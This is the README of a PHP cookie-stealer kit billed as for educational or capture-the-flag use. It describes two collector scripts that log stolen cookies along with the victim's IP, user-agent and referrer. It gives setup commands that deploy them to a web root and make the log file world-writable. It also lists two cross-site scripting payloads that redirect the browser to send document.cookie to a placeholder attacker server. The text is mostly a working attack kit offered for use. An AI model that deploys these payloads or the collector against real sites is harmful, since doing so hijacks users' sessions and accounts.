# cookie-stealer

Simple PHP cookie stealer for educational/CTF use.

## Files

- `p1.php` - Logs cookie value to `cookie.txt`
- `p2.php` - Logs cookie, IP, user-agent, date, referrer to `cookie.txt`

## Setup

```bash
cp * /var/www/html/
chmod 666 cookie.txt
```

## Payload examples

```html
<script>window.location="http://your-server/p1.php?txt="+document.cookie</script>
<img src=x onerror=window.location="http://your-server/p1.php?txt="+document.cookie>
```
